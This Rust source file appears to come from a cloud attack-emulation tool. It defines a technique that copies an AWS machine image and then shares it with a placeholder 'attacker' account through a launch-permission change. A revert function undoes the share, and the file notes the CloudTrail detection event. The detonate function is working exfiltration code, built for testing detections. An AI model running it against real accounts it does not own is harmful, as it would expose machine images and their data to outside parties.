use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
terraform {
  required_providers {
    aws    = { source = "hashicorp/aws",    version = "~> 5.0" }
    random = { source = "hashicorp/random", version = "~> 3.0" }
  }
}

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

data "aws_ami" "amazon_linux_2" {
  most_recent = true
  owners      = ["amazon"]
  filter {
    name   = "name"
    values = ["amzn2-ami-hvm-*-x86_64-gp2"]
  }
}

resource "aws_ami_copy" "target" {
  name              = "stratus-red-team-ami-${random_string.suffix.result}"
  description       = "Stratus Red Team test AMI"
  source_ami_id     = data.aws_ami.amazon_linux_2.id
  source_ami_region = data.aws_region.current.name

  tags = {
    Name = "stratus-red-team-ami-${random_string.suffix.result}"
  }
}

data "aws_region" "current" {}

output "ami_id" {
  value = aws_ami_copy.target.id
}
"#;

const ATTACKER_ACCOUNT_ID: &str = "012345678901";

async fn detonate_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let ami_id = outputs
        .get("ami_id")
        .ok_or_else(|| anyhow::anyhow!("missing output: ami_id"))?;

    aws.ec2
        .modify_image_attribute()
        .image_id(ami_id)
        .attribute("launchPermission")
        .launch_permission(
            aws_sdk_ec2::types::LaunchPermissionModifications::builder()
                .add(
                    aws_sdk_ec2::types::LaunchPermission::builder()
                        .user_id(ATTACKER_ACCOUNT_ID)
                        .build(),
                )
                .build(),
        )
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!(
        "Shared AMI {} with attacker account {} via launchPermission.",
        ami_id, ATTACKER_ACCOUNT_ID
    );

    Ok(())
}

fn detonate(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let ami_id = outputs
        .get("ami_id")
        .ok_or_else(|| anyhow::anyhow!("missing output: ami_id"))?;

    aws.ec2
        .modify_image_attribute()
        .image_id(ami_id)
        .attribute("launchPermission")
        .launch_permission(
            aws_sdk_ec2::types::LaunchPermissionModifications::builder()
                .remove(
                    aws_sdk_ec2::types::LaunchPermission::builder()
                        .user_id(ATTACKER_ACCOUNT_ID)
                        .build(),
                )
                .build(),
        )
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!(
        "Removed launchPermission for attacker account {} from AMI {}.",
        ATTACKER_ACCOUNT_ID, ami_id
    );

    Ok(())
}

fn revert(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "aws.exfiltration.ec2-share-ami",
        friendly_name: "Exfiltrate EC2 AMI by Sharing It",
        description: "Shares a custom EC2 AMI with an external attacker-controlled AWS account by modifying its launch permissions. Simulates data exfiltration by giving an attacker access to a machine image that may contain sensitive data.",
        detection: "CloudTrail: ModifyImageAttribute with launchPermission.",
        platform: Platform::Aws,
        mitre_tactics: &[MitreTactic::Exfiltration],
        is_idempotent: false,
        is_slow: false,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: Some(revert),
    }
}
